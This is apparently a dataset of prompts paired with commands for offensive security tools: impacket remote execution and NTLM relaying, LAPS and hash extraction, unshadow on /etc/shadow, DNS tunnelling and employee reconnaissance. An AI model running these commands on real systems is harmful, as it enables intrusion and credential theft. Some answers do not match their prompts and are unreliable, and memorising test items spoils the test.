{"input": "Retrieve all computer objects from the domain \"test.local\" using NTLM hashes for authentication, with debugging output enabled", "answer": "impacket-GetADComputers -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -debug test.local"}
{"input": "Retrieve all computer objects from the domain \"test.example.com\" using NTLM hashes for authentication and specify the domain controller IP as 10.10.10.1", "answer": "impacket-GetADComputers -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.10.10.1 test.example.com"}
{"input": "Fetch all computer objects from the domain \"example.net\" using Kerberos authentication, with timestamps added to the logging output and debugging enabled", "answer": "impacket-GetADComputers -k -ts -debug example.net"}
{"input": "Fetch all user accounts from the domain \"corp.local\" using Kerberos authentication without prompting for a password", "answer": "impacket-GetADUsers corp.local -all -k -no-pass"}
{"input": "Fetch all user accounts from the domain \"example.net\" using the username \"user1\" and password \"pass123\", and add timestamps to the logging output", "answer": "impacket-GetADUsers example.net/user1:pass123 -all -ts"}
{"input": "Retrieve all user accounts from the domain \"domain.local\" using Kerberos authentication and specify the domain controller hostname as \"dc1.domain.local\"", "answer": "impacket-GetADUsers domain.local -all -k -dc-host dc1.domain.local"}
{"input": "Retrieve the LAPS password for the computer \"SERVER01\" in the domain \"corp.local\" using Kerberos authentication and debug output enabled", "answer": "impacket-GetLAPSPassword corp.local -computer SERVER01 -k -debug"}
{"input": "Retrieve the LAPS password for the computer \"LAPTOP-456\" in the domain \"example.org\" without prompting for a password and use AES key for Kerberos authentication", "answer": "impacket-GetLAPSPassword example.org -computer LAPTOP-456 -no-pass -aesKey 1234567890ABCDEF1234567890ABCDEF"}
{"input": "Extract the LAPS password for the computer \"WORKSTATION-789\" in the domain \"domain.com\" using Kerberos authentication, enable timestamp logging, and specify the domain controller hostname as \"dc1.domain.com\"", "answer": "impacket-GetLAPSPassword domain.com -computer WORKSTATION-789 -k -ts -dc-host dc1.domain.com"}
{"input": "Extract the LAPS password for the computer \"PC-007\" in the domain \"example.net\" using Kerberos authentication, specify the domain controller IP as \"10.0.0.1\", and enable timestamp logging", "answer": "impacket-GetLAPSPassword example.net -computer PC-007 -k -dc-ip 10.0.0.1 -ts"}
{"input": "Retrieve the LAPS password for the computer \"SERVER-02\" in the domain \"corp.com\" without using a password, and specify the domain controller hostname as \"dc2.corp.com\"", "answer": "impacket-GetLAPSPassword corp.com -computer SERVER-02 -no-pass -dc-host dc2.corp.com"}
{"input": "Execute the command `whoami` on the target machine with IP `192.168.1.10` using the username `admin` and password `Password123`", "answer": "impacket-atexec admin:Password123@192.168.1.10 whoami"}
{"input": "Execute the command `net user` on the target machine `192.168.2.20` using Kerberos authentication, with the AES key `1234567890ABCDEF1234567890ABCDEF`", "answer": "impacket-atexec -k -aesKey 1234567890ABCDEF1234567890ABCDEF administrator@192.168.2.20 net user"}
{"input": "Change the password for the user `dave` on the domain `test.org` hosted at `10.10.20.30` using the new password `SecurePass123`. Enable debug output and add timestamps to the logging", "answer": "impacket-changepasswd test.org/dave@10.10.20.30 -newpass SecurePass123 -ts -debug"}
{"input": "Attack the NSPI interface of the Exchange server at 172.16.20.30 using the username \"admin\" and password \"admin123\" with debug output enabled and the RPC hostname set to \"EXCHANGE-SRV\"", "answer": "impacket-exchanger -debug -rpc-hostname EXCHANGE-SRV admin:admin123@172.16.20.30 nspi"}
{"input": "Attack the NSPI interface of the Exchange server at 192.168.10.15 using the domain \"DOMAIN\", username \"svc_exchange\", and NTLM hashes \"00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c\" with debug output enabled", "answer": "impacket-exchanger -debug -hashes 00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c DOMAIN/svc_exchange@192.168.10.15 nspi"}
{"input": "Attack the NSPI interface of the Exchange server at 172.16.30.40 using the domain \"TESTDOMAIN\", username \"user2\", and NTLM hashes \"aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\" with the RPC hostname set to \"EXCH-TEST\"", "answer": "impacket-exchanger -rpc-hostname EXCH-TEST -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c TESTDOMAIN/user2@172.16.30.40 nspi"}
{"input": "Determine the OS architecture of the target machine at 192.168.0.10 with the default settings", "answer": "nmap -O 192.168.0.10"}
{"input": "Start the karmaSMB server to serve the contents of the directory `/var/www/html` to SMB clients, and enable experimental SMB2 support", "answer": "impacket-karmaSMB -smb2support -share /var/www/html"}
{"input": "Use impacket-mimikatz to authenticate to the target machine 10.10.10.10 without prompting for a password, and specify the domain controller IP as 10.10.10.1", "answer": "impacket-mimikatz -no-pass -dc-ip 10.10.10.1 user@10.10.10.10"}
{"input": "Run impacket-mimikatz on the target machine 10.1.1.50 using NTLM hashes for authentication, with the LM hash \"00000000000000000000000000000000\" and the NT hash \"ffffffffffffffffffffffffffffffff\", and specify the domain controller IP as 10.1.1.1", "answer": "impacket-mimikatz -hashes 00000000000000000000000000000000:ffffffffffffffffffffffffffffffff -dc-ip 10.1.1.1 user@10.1.1.50"}
{"input": "Use impacket-mimikatz to authenticate to the target machine 172.17.1.1 using NTLM hashes for authentication, with the LM hash \"00000000000000000000000000000000\" and the NT hash \"00000000000000000000000000000000\", and specify the domain controller IP as 172.17.1.10", "answer": "impacket-mimikatz -hashes 00000000000000000000000000000000:00000000000000000000000000000000 -dc-ip 172.17.1.10 user@172.17.1.1"}
{"input": "Connect to the MSSQL server at 192.168.1.100 using Windows Authentication and enable debug output", "answer": "impacket-mssqlclient -windows-auth -debug 192.168.1.100"}
{"input": "Connect to the MSSQL server at `sqlserver.corp.local` using Windows Authentication, specify the domain controller IP as `10.0.0.1`, and enable debug output", "answer": "impacket-mssqlclient -windows-auth -dc-ip 10.0.0.1 -debug sqlserver.corp.local"}
{"input": "Ask the remote host at 10.10.10.50 for its MSSQL instances without specifying a custom timeout", "answer": "impacket-mssqlinstance 10.10.10.50"}
{"input": "Retrieve MSSQL instance information from the host at 10.0.0.1, using the default timeout setting", "answer": "impacket-mssqlinstance 10.0.0.1"}
{"input": "Relay NTLM credentials to multiple targets listed in a file named `targets.txt`, enable debugging, and randomize target selection.\"", "answer": "impacket-ntlmrelayx -tf targets.txt -debug -ra"}
{"input": "Relay NTLM credentials to the target `192.168.1.200`, disable multi-host relay, and keep relaying even after a successful connection.\"", "answer": "impacket-ntlmrelayx -t 192.168.1.200 --no-multirelay --keep-relaying"}
{"input": "Use impacket-ping to verify if the destination IP 172.16.32.45 is reachable from the source IP 172.16.32.10", "answer": "impacket-ping 172.16.32.45"}
{"input": "Execute a command on the target machine 192.168.1.10 using a specific domain controller IP and debug output enabled", "answer": "impacket-psexec -dc-ip 192.168.1.1 -debug admin:password123@192.168.1.10"}
{"input": "Verify if the account \"user1\" in the domain \"CORP\" with the password \"Secret123\" is valid on the RDP service at the hostname \"rdp-server.corp.local\"", "answer": "impacket-rdp_check CORP/user1:Secret123@rdp-server.corp.local"}
{"input": "Bruteforce major versions of UUIDs on the target IP 192.168.0.200 using the default port 135 and enable debug output", "answer": "impacket-rpcmap ncacn_ip_tcp:192.168.0.200[135] -brute-versions -debug"}
{"input": "Connect to the target machine 10.10.10.5 using Kerberos authentication, specifying the AES key \"1234567890abcdef1234567890abcdef\" and the domain controller IP 10.10.10.1", "answer": "impacket-smbexec domain/user@10.10.10.5 -k -aesKey 1234567890abcdef1234567890abcdef -dc-ip 10.10.10.1"}
{"input": "Execute commands on the target machine 192.168.2.15 using the username \"testuser\" and password \"Test1234\", and enable debug output for troubleshooting", "answer": "impacket-smbexec testuser:Test1234@192.168.2.15 -debug"}
{"input": "Connect to the target machine 192.168.3.100 using the username \"admin\" and password \"AdminPass\", and specify the target IP as 192.168.3.100 in case the hostname cannot be resolved", "answer": "impacket-smbexec admin:AdminPass@192.168.3.100 -target-ip 192.168.3.100"}
{"input": "Connect to the target machine 192.168.4.200 using the username \"john\" and password \"JohnDoe123\", and specify the output share as \"D$\" instead of the default \"C$\"", "answer": "impacket-smbexec john:JohnDoe123@192.168.4.200 -share D$"}
{"input": "Execute commands on the target machine 10.10.20.30 using the username \"admin\" and password \"SecurePass\", and add timestamps to the logging output", "answer": "impacket-smbexec admin:SecurePass@10.10.20.30 -ts"}
{"input": "Connect to the target machine 192.168.5.10 using the username \"user2\" and password \"Pass123!\", and specify the destination port as 4450 instead of the default SMB port", "answer": "impacket-smbexec user2:Pass123!@192.168.5.10 -port 4450"}
{"input": "Execute commands on the target machine 10.0.1.100 using the username \"admin\" and password \"Admin123\", and specify the service name as \"backup\" to trigger the payload", "answer": "impacket-smbexec admin:Admin123@10.0.1.100 -service-name backup"}
{"input": "Launch an SMB server with the share name \"DATA\" and the path \"/var/data\", and log all output to a file named \"smb_log.txt\"", "answer": "impacket-smbserver DATA /var/data > smb_log.txt 2>&1"}
{"input": "Capture traffic on the `any` interface and filter for HTTP traffic only", "answer": "tcpdump -i any 'tcp port 80'"}
{"input": "Sniff all network traffic on interface eth0 using impacket-sniffer, filter for DNS traffic, and display the captured packets in real-time", "answer": "impacket-sniffer -i eth0 -f \"udp port 53\" -r"}
{"input": "Capture all network traffic on interface wlan1 using impacket-sniffer, filter for traffic to and from IP address 192.168.1.100, and save the output to a file named specific_ip_traffic.pcap", "answer": "impacket-sniffer -i wlan1 -o specific_ip_traffic.pcap -f \"host 192.168.1.100\""}
{"input": "Sniff all network traffic on interface eth2 using impacket-sniffer, filter for traffic on port 443 (HTTPS), and display the captured packets in real-time", "answer": "impacket-sniffer -i eth2 -f \"tcp port 443\" -r"}
{"input": "Convert a Kerberos ticket from kirbi format to ccache format using impacket-ticketConverter", "answer": "impacket-ticketConverter ticket.kirbi ticket.ccache"}
{"input": "I have a Kerberos ticket in kirbi format named `user_ticket.kirbi`. Convert it to ccache format and save it as `user_ticket.ccache`", "answer": "impacket-ticketConverter user_ticket.kirbi user_ticket.ccache"}
{"input": "Convert a Kerberos ticket from ccache format to kirbi format, where the input file is `service_ticket.ccache` and the output file should be `service_ticket.kirbi`", "answer": "impacket-ticketConverter service_ticket.ccache service_ticket.kirbi"}
{"input": "I need to convert a Kerberos ticket stored in `admin_ticket.kirbi` to ccache format and save it as `admin_ticket.ccache`", "answer": "impacket-ticketConverter admin_ticket.kirbi admin_ticket.ccache"}
{"input": "Convert a Kerberos ticket from ccache format to kirbi format, where the input file is `backup_ticket.ccache` and the output file should be `backup_ticket.kirbi`", "answer": "impacket-ticketConverter backup_ticket.ccache backup_ticket.kirbi"}
{"input": "Convert a Kerberos ticket from ccache format to kirbi format, where the input file is `temp_ticket.ccache` and the output file should be `temp_ticket.kirbi`", "answer": "impacket-ticketConverter temp_ticket.ccache temp_ticket.kirbi"}
{"input": "I need to convert a Kerberos ticket stored in `domain_admin_ticket.kirbi` to ccache format and save it as `domain_admin_ticket.ccache`", "answer": "impacket-ticketConverter domain_admin_ticket.kirbi domain_admin_ticket.ccache"}
{"input": "Convert a Kerberos ticket from ccache format to kirbi format, where the input file is `root_ticket.ccache` and the output file should be `root_ticket.kirbi`", "answer": "impacket-ticketConverter root_ticket.ccache root_ticket.kirbi"}
{"input": "Sign out the Remote Desktop Services session with ID 4 on the target machine at 192.168.1.180 using the username \"admin\" and no password", "answer": "impacket-tstool -no-pass admin@192.168.1.180 logoff 4"}
{"input": "Run a WMI query on the target machine at IP 192.168.1.50 using the username \"admin\" and password \"password123\", with the RPC authentication level set to integrity, and retrieve all information from the default namespace", "answer": "impacket-wmiquery -rpc-auth-level integrity admin:password123@192.168.1.50 'SELECT * FROM Win32_OperatingSystem'"}
{"input": "Run INetSim and log all activities to the directory `/var/log/inetsim/logs`", "answer": "inetsim --log-dir=/var/log/inetsim/logs"}
{"input": "Run INetSim with an initial faketime delta of 3600 seconds", "answer": "inetsim --faketime-init-delta=3600"}
{"input": "Run INetSim and store the process ID in the file `/var/run/inetsim_custom.pid`", "answer": "inetsim --pidfile=/var/run/inetsim_custom.pid"}
{"input": "Run INetSim and store reports in the directory `/var/reports/inetsim_reports`", "answer": "inetsim --report-dir=/var/reports/inetsim_reports"}
{"input": "Start INetSim using the data directory `/var/lib/inetsim/data` for service data", "answer": "inetsim --data-dir=/var/lib/inetsim/data"}
{"input": "Visualize a captured radio signal file named \"capture_signal.dat\" with a sample rate of 2.4 MHz using inspectrum", "answer": "inspectrum -r 2400000 capture_signal.dat"}
{"input": "Analyze a large radio signal file \"large_signal.dat\" with a sample rate of 1 MHz using inspectrum", "answer": "inspectrum -r 1000000 large_signal.dat"}
{"input": "Visualize a complex signal file \"complex_signal.dat\" with a sample rate of 1.2 MHz using inspectrum", "answer": "inspectrum -r 1200000 complex_signal.dat"}
{"input": "Discover employees of \"CloudNet\" with job titles listed in \"cloud_titles.txt\" and save the results in a JSON file named \"cloudnet_employees.json\"", "answer": "inspy --titles cloud_titles.txt --json cloudnet_employees.json CloudNet"}
{"input": "Discover employees of \"AutoDrive\" with job titles listed in \"auto_titles.txt\" and save the results in a CSV file named \"autodrive_employees.csv\"", "answer": "inspy --titles auto_titles.txt --csv autodrive_employees.csv AutoDrive"}
{"input": "Download all posts, stories, highlights, tagged posts, reels, and IGTV videos from the Instagram profile \"example_user\" while also downloading geotags and comments for each post", "answer": "instaloader --stories --highlights --tagged --reels --igtv --geotags --comments example_user"}
{"input": "Download all posts from your Instagram feed, including geotags and comments, but do not download videos or video thumbnails", "answer": "instaloader --geotags --comments --no-videos --no-video-thumbnails :feed"}
{"input": "Download all saved posts from your Instagram account, including comments, but do not create metadata JSON files", "answer": "instaloader --comments --no-metadata-json :saved"}
{"input": "Trace the route to the host `test.com` using InTrace with IPv4 and a debugging level of 0", "answer": "intrace -h test.com -d 0 -4"}
{"input": "Set up an iodined server with the tunnel IP 10.0.0.1, netmask 255.255.255.0, and top domain `dns-tunnel.example.com`. Use the password `securepass` for authentication and drop privileges to the user `nobody`", "answer": "iodined -u nobody -P securepass 10.0.0.1/24 dns-tunnel.example.com"}
{"input": "Configure an iodined server with the tunnel IP 10.1.1.1, netmask 255.255.255.0, and top domain `tunnel.example.com`. Set the maximum idle time to 300 seconds before shutting down", "answer": "iodined -i 300 10.1.1.1/24 tunnel.example.com"}
{"input": "Set up an iodined server with the tunnel IP 10.2.0.1, netmask 255.255.0.0, and top domain `secure-tunnel.example.com`. Listen on all interfaces and respond to NS queries with the IP 192.168.2.200", "answer": "iodined -l 0.0.0.0 -n 192.168.2.200 10.2.0.1/16 secure-tunnel.example.com"}
{"input": "Accept traffic from the IPv6 source address prefix `2001:db8::/64` and the Ethernet source address `00:11:22:33:44:55` on the network interface `eth0`", "answer": "ip6tables -A INPUT -i eth0 -s 2001:db8::/64 -m mac --mac-source 00:11:22:33:44:55 -j ACCEPT"}
{"input": "Retrieve the NS records for the domain `example.com` and append the results to `domains-ns.txt`", "answer": "dig NS example.com +short >> domains-ns.txt"}
{"input": "Send the file \"payload.bin\" as a raw Ethernet frame using the network interface \"eth0\"", "answer": "file2cable -i eth0 -f payload.bin"}
{"input": "Transmit the file \"data.pcap\" as a raw Ethernet frame on the interface \"wlan0\" with verbose output", "answer": "file2cable -v -i wlan0 -f data.pcap"}
{"input": "Send the file \"test_frame.raw\" as a raw Ethernet frame on the interface \"enp0s3\" without verbose output", "answer": "file2cable -i enp0s3 -f test_frame.raw -q"}
{"input": "Use the file \"custom_packet.raw\" to send a raw Ethernet frame on the interface \"eth1\" and display detailed logs", "answer": "file2cable -v -i eth1 -f custom_packet.raw"}
{"input": "Transmit the file \"capture.raw\" as a raw Ethernet frame on the interface \"eth2\" and ensure verbose output is enabled", "answer": "file2cable -v -i eth2 -f capture.raw"}
{"input": "Use the file \"experiment.raw\" to send a raw Ethernet frame on the interface \"eth4\" and enable verbose output for debugging", "answer": "file2cable -v -i eth4 -f experiment.raw"}
{"input": "Transmit the file \"test_data.raw\" as a raw Ethernet frame on the interface \"eth6\" and enable verbose logging for detailed information", "answer": "file2cable -v -i eth6 -f test_data.raw"}
{"input": "Enumerate all hosts in the network range 192.168.10.0/24 and display only the IP addresses without any additional information", "answer": "nmap -sn 192.168.10.0/24 -oG - | awk '/Up$/{print $2}'"}
{"input": "Enumerate all hosts in the network range 10.0.5.0/24 and use a custom number of retries (3) for each ping request", "answer": "nmap -sn --max-retries 3 10.0.5.0/24"}
{"input": "Trace the route to the destination IP 192.0.2.8 using the network interface eth3, sending 10 probes per hop and a source port of 5000", "answer": "traceroute -i eth3 -q 10 -s 5000 192.0.2.8"}
{"input": "Run evilgrade with all modules enabled, set the fake update server IP to 192.168.1.100, and log all activities to `simulation.log`", "answer": "evilgrade -a -i 192.168.1.100 -l simulation.log"}
{"input": "Convert all Nmap scan results from a file named `nmap_scan.xml` into the IVRE database format", "answer": "ivre scan2db --all nmap_scan.xml"}
{"input": "Import all Zeek (formerly Bro) logs from a directory named `zeek_logs` into the IVRE database", "answer": "ivre zeek2db --all zeek_logs/"}
{"input": "Import all p0f scan results from a file named `p0f_results.log` into the IVRE database", "answer": "ivre p0f2db --all p0f_results.log"}
{"input": "List all wireless devices and their capabilities", "answer": "iw phy list"}
{"input": "Scan for available Wi-Fi networks on the `wlan0` interface", "answer": "iw dev wlan0 scan"}
{"input": "Set the transmit power of the `wlan0` interface to 20 dBm", "answer": "iw dev wlan0 set txpower fixed 2000"}
{"input": "Show the current regulatory domain settings for the wireless device `phy0`", "answer": "iw phy phy0 reg get"}
{"input": "Retrieve the current link status of the `wlan0` interface", "answer": "iw dev wlan0 link"}
{"input": "Set the fragmentation threshold to 256 bytes on the `phy0` device", "answer": "iw phy phy0 set frag 256"}
{"input": "Decompile the APK file \"app.apk\" and save the output to the directory \"output_dir\" without decompiling the resources", "answer": "jadx -d output_dir --no-res app.apk"}
{"input": "Decompile the APK file \"app.apk\" and save the output to the directory \"output_dir\" while showing inconsistent code that was incorrectly decompiled", "answer": "jadx -d output_dir --show-bad-code app.apk"}
{"input": "Decompile the APK file \"app.apk\" and save the output to the directory \"output_dir\" while adding comments with debug line numbers if available", "answer": "jadx -d output_dir --add-debug-lines app.apk"}
{"input": "Decompile the APK file \"app.apk\" and save the output to the directory \"output_dir\" while disabling the inline of methods", "answer": "jadx -d output_dir --no-inline-methods app.apk"}
{"input": "Decompile the APK file \"app.apk\" and save the output to the directory \"output_dir\" while disabling the move of inner classes into their parent classes", "answer": "jadx -d output_dir --no-move-inner-classes app.apk"}
{"input": "Decompile the APK file \"app.apk\" and save the output to the directory \"output_dir\" while disabling the inline of Kotlin lambdas", "answer": "jadx -d output_dir --no-inline-kotlin-lambda app.apk"}
{"input": "Decompile the APK file `app.apk` and save the output to the directory `output_dir` without decompiling the resources", "answer": "jadx --no-res -d output_dir app.apk"}
{"input": "Decompile the APK file `app.apk` and export the result as a Gradle project in the directory `gradle_output`", "answer": "jadx --export-gradle -d gradle_output app.apk"}
{"input": "Send a broadcast message to all devices on the network using port 9999 and allow broadcasting", "answer": "nc -b -u 255.255.255.255 9999"}
{"input": "Convert the hexadecimal string \"4A6F686E446F65\" to a base64 MIME encoded string, ensuring the output is in uppercase and includes trailing equals signs", "answer": "echo '4A6F686E446F65' | xxd -r -p | base64 | tr '[:lower:]' '[:upper:]'"}
{"input": "Convert the base64 MIME encoded string \"QWxhZGRpbjpvcGVuIHNlc2FtZQ==\" to a hexadecimal string, ensuring the output is in uppercase", "answer": "echo 'QWxhZGRpbjpvcGVuIHNlc2FtZQ==' | base64 -d | xxd -p -u"}
{"input": "Retrieve BitLocker recovery data from the disk image stored at `/var/lib/bitlocker/disk.img`", "answer": "bitlocker2john /var/lib/bitlocker/disk.img"}
{"input": "Convert EAP-MD5 authentication data from the network traffic file `network_traffic.pcap` into a format compatible with John the Ripper", "answer": "eapmd5tojohn -r network_traffic.pcap"}
{"input": "Create a password list with `genmkvpwd` using the statfile `data.bin`, a maximum level of 8, and a maximum length of 12, without specifying start and end positions", "answer": "genmkvpwd data.bin 8 12"}
{"input": "Use `genmkvpwd` to generate passwords from the statfile `stats.db` with a maximum level of 4, a maximum length of 7, starting at position 500, and ending at position 1000", "answer": "genmkvpwd stats.db 4 7 500 1000"}
{"input": "Convert all GPG-encrypted files in the current directory to John the Ripper format using gpg2john", "answer": "gpg2john *.gpg > output.txt"}
{"input": "Extract the hash from a specific GPG-encrypted file named `secret.gpg` and save it to a file called `hash.txt`", "answer": "gpg2john secret.gpg > hash.txt"}
{"input": "Convert all GPG-encrypted files in the directory `/home/user/gpg_files/` to John the Ripper format and save the output to `/home/user/hashes/all_hashes.txt`", "answer": "gpg2john /home/user/gpg_files/*.gpg > /home/user/hashes/all_hashes.txt"}
{"input": "Convert a GPG-encrypted file named `data.gpg` to John the Ripper format and save the output to a file named `data_hash.txt`, but only if the file is not empty", "answer": "if [ -s data.gpg ]; then gpg2john data.gpg > data_hash.txt; fi"}
{"input": "Use hccap2john to process multiple handshake capture files (`handshake1.hccap`, `handshake2.hccap`, and `handshake3.hccap`) and combine their output into a single John the Ripper file", "answer": "hccap2john handshake1.hccap handshake2.hccap handshake3.hccap > combined_output.john"}
{"input": "Use hccap2john to process all handshake capture files in the `/tmp/captures` directory and append the output to an existing file `/home/user/john_files/all_captures.john`", "answer": "hccap2john /tmp/captures/*.hccap >> /home/user/john_files/all_captures.john"}
{"input": "Extract the hash from a KeePass database file named \"secrets.kdbx\" using a keyfile named \"keyfile.key\"", "answer": "keepass2john -k keyfile.key secrets.kdbx"}
{"input": "Convert all PuTTY private key files in the current directory to John the Ripper format", "answer": "putty2john *.ppk"}
{"input": "Convert multiple PuTTY private key files (`key1.ppk`, `key2.ppk`, `key3.ppk`) to John the Ripper format in one go", "answer": "putty2john key1.ppk key2.ppk key3.ppk"}
{"input": "Convert all PuTTY private key files in the `/home/user/keys` directory to John the Ripper format", "answer": "putty2john /home/user/keys/*.ppk"}
{"input": "Convert all PuTTY private key files in the current directory to John the Ripper format and append the results to an existing file named `hashes.txt`", "answer": "putty2john *.ppk >> hashes.txt"}
{"input": "Convert all PuTTY private key files in the `/etc/ssh/keys` directory to John the Ripper format and save the output to a file named `ssh_hashes.txt`", "answer": "putty2john /etc/ssh/keys/*.ppk > ssh_hashes.txt"}
{"input": "Convert a PuTTY private key file named `admin_key.ppk` to John the Ripper format and pipe the output to another command for further processing", "answer": "putty2john admin_key.ppk | some_other_command"}
{"input": "Convert all PuTTY private key files in the current directory to John the Ripper format and save the output to a file named `all_hashes.txt`", "answer": "putty2john *.ppk > all_hashes.txt"}
{"input": "Convert the hexadecimal string \"70617373776f7264313233\" back to its raw data format using raw2dyna", "answer": "echo '70617373776f7264313233' | xxd -p -r"}
{"input": "Use uaf2john to extract hashes from all `.uac` files in the `/etc/security` directory and save the output to a file named `hashes.txt`", "answer": "uaf2john /etc/security/*.uac > hashes.txt"}
{"input": "Use uaf2john to extract hashes from all UAC files in the `/var/lib/auth` directory and save the output to a file named `auth_hashes.txt` in the `/tmp` directory", "answer": "uaf2john /var/lib/auth/*.uac > /tmp/auth_hashes.txt"}
{"input": "Clean up a wordlist by removing duplicate lines and save the result to \"cleaned_list.txt\"", "answer": "sort -u input_wordlist.txt > cleaned_list.txt"}
{"input": "Remove duplicate entries from a wordlist and output the unique entries to a new file named \"final_list.txt\"", "answer": "sort -u <input_wordlist.txt> > final_list.txt"}
{"input": "Clean a wordlist by removing duplicates and save the result to \"clean_wordlist.txt\"", "answer": "sort -u wordlist.txt > clean_wordlist.txt"}
{"input": "Combine the `/etc/passwd` and `/etc/shadow` files to create a single file for password cracking", "answer": "unshadow /etc/passwd /etc/shadow"}
{"input": "Generate a combined file from `user_passwd` and `user_shadow` files in the current directory for testing password policies", "answer": "unshadow ./user_passwd ./user_shadow"}
{"input": "Merge the passwd and shadow files from a backup located at `/backup/etc/passwd` and `/backup/etc/shadow` to analyze user credentials", "answer": "unshadow /backup/etc/passwd /backup/etc/shadow"}
{"input": "Merge the passwd and shadow files from a virtual machine image mounted at `/mnt/vm_image/etc/passwd` and `/mnt/vm_image/etc/shadow` for security auditing", "answer": "unshadow /mnt/vm_image/etc/passwd /mnt/vm_image/etc/shadow"}
{"input": "Extract VNC password hashes from the PCAP file `network_capture.pcap` and save the output to a file named `vnc_hashes.txt`", "answer": "vncpcap2john network_capture.pcap > vnc_hashes.txt"}
{"input": "Convert the PCAP file `wpa_capture.pcap` to John the Ripper format, including duplicate hashes for each AP/STA pair", "answer": "wpapcap2john -d wpa_capture.pcap"}
{"input": "Extract the hash from a ZIP file named \"archive.zip\" and save the output to a file named \"output.hash\"", "answer": "zip2john archive.zip > output.hash"}
{"input": "Convert the 1Password vault file \"my_vault.opvault\" to a John the Ripper-compatible hash format", "answer": "1password2john my_vault.opvault"}
{"input": "Extract the hash from the 1Password Agile Keychain file \"my_keychain.agilekeychain\" for use with John the Ripper", "answer": "1password2john my_keychain.agilekeychain"}
{"input": "Generate a John the Ripper-compatible hash from the 1Password OPVault file \"backup_vault.opvault\" located in the \"/home/user/vaults\" directory", "answer": "1password2john /home/user/vaults/backup_vault.opvault"}
{"input": "Extract the hash from the 1Password OPVault file \"personal_vault.opvault\" for use in John the Ripper", "answer": "1password2john personal_vault.opvault"}
{"input": "Convert the 1Password OPVault file \"archive_vault.opvault\" to a hash format for password cracking with John the Ripper", "answer": "1password2john archive_vault.opvault"}
{"input": "Generate a John the Ripper-compatible hash from the 1Password OPVault file \"shared_vault.opvault\" located in the \"/vaults/shared\" directory", "answer": "1password2john /vaults/shared/shared_vault.opvault"}
{"input": "Generate a hash file for the 7z archive \"backup.7z\" using 7z2john, including all supported hash types", "answer": "7z2john backup.7z"}
{"input": "Extract all DPAPI master keys from the file `system.dat` and prepare them for password cracking with John the Ripper", "answer": "dpapimk2john -all system.dat"}
{"input": "Retrieve all DPAPI master keys from the file `encrypted_keys.dat` and output them in a John the Ripper-compatible format", "answer": "dpapimk2john -all encrypted_keys.dat"}
{"input": "Extract all DPAPI master keys from the file `vault.dat` and prepare them for password cracking", "answer": "dpapimk2john -all vault.dat"}
{"input": "Extract all DPAPI master keys from the file `data.dat` and prepare them for password cracking", "answer": "dpapimk2john -all data.dat"}
{"input": "Convert the ADXCSOUF file \"secret.adxcsouf\" to a John the Ripper-compatible format, using all available extraction methods", "answer": "adxcsouf2john secret.adxcsouf --all"}
{"input": "Extract password hashes from a specific AEM file named `repository.xml` located in `/opt/aem/crx-quickstart/repository/`", "answer": "aem2john /opt/aem/crx-quickstart/repository/repository.xml"}
{"input": "I need to extract password hashes from the AIX shadow file `/var/security/passwd` for cracking with John the Ripper", "answer": "aix2john -f /var/security/passwd"}
{"input": "Convert the AIX shadow file `/etc/security/passwd` to John the Ripper format without any special hashing options", "answer": "aix2john -f /etc/security/passwd"}
{"input": "I have an AIX shadow file at `/backup/passwd_archive`. How can I prepare it for cracking with John the Ripper if standard hashing is enabled?", "answer": "aix2john /backup/passwd_archive"}
{"input": "Convert the AIX shadow file `/etc/security/passwd` to John the Ripper format, assuming no special hashing options are needed", "answer": "aix2john -f /etc/security/passwd"}
{"input": "How do I convert the AIX shadow file `/etc/security/passwd` to John the Ripper format if the system uses standard hashing?", "answer": "aix2john /etc/security/passwd"}
{"input": "Extract hashes from the AIX shadow file `/root/passwd_backup` for cracking with John the Ripper, assuming no special hashing options are needed", "answer": "aix2john -f /root/passwd_backup"}
{"input": "Convert the AndOTP backup file `backup.json` into a John the Ripper-compatible format", "answer": "andotp2john backup.json"}
{"input": "Extract the hash from the AndOTP backup file `my_otp_backup.json` and save the output to a file named `otp_hash.txt`", "answer": "andotp2john my_otp_backup.json > otp_hash.txt"}
{"input": "Process the AndOTP backup file `backup_v2.json` and display verbose output during the conversion", "answer": "andotp2john --verbose backup_v2.json"}
{"input": "Convert the AndOTP backup file `otp_data.json` and include all available information while saving the output to `otp_data_hash.txt`", "answer": "andotp2john --all otp_data.json > otp_data_hash.txt"}
{"input": "Use the `--all` flag to extract every possible hash format from the Android backup file `backup_2023.ab`", "answer": "androidbackup2john backup_2023.ab"}
{"input": "I need to extract the encryption key from an Android FDE data partition (`/evidence/data.img`) and footer partition (`/evidence/footer.img`) for forensic analysis. What command should I use?", "answer": "androidfde2john /evidence/data.img /evidence/footer.img"}
{"input": "I need to extract the encryption key from an Android FDE data partition (`/home/user/data.img`) and footer partition (`/home/user/footer.img`) for decryption purposes. What command should I use?", "answer": "androidfde2john /home/user/data.img /home/user/footer.img"}
{"input": "Convert all Apex password hashes stored in the file `apex_hashes.txt` to a format compatible with John the Ripper", "answer": "apex2john apex_hashes.txt"}
{"input": "Convert all Apex password hashes from the backup file `apex_backup.bak` to a John the Ripper-compatible format", "answer": "apex2john apex_backup.bak"}
{"input": "Convert all Apex password hashes stored in the file `apex_data.csv` to a John the Ripper-compatible format", "answer": "apex2john apex_data.csv"}
{"input": "Convert all Apex password hashes from the file `apex_export.xml` to a format compatible with John the Ripper", "answer": "apex2john apex_export.xml"}
{"input": "Convert all Apex password hashes from the file `apex_hashes.db` to a John the Ripper-compatible format", "answer": "apex2john apex_hashes.db"}
{"input": "Extract password hashes from an Aruba configuration file named \"config.txt\" and save the output to a file called \"hashes.txt\"", "answer": "aruba2john config.txt > hashes.txt"}
{"input": "Extract password hashes from an Aruba configuration file named \"backup.cfg\" and pipe the output to John the Ripper for cracking", "answer": "aruba2john backup.cfg | john --stdin"}
{"input": "Extract password hashes from an Aruba configuration file named \"network.cfg\" and save the output to a file called \"aruba_hashes.txt\" for later use", "answer": "aruba2john network.cfg > aruba_hashes.txt"}
{"input": "Extract password hashes from an Aruba configuration file named \"router.cfg\" and append the output to an existing file named \"all_hashes.txt\"", "answer": "aruba2john router.cfg >> all_hashes.txt"}
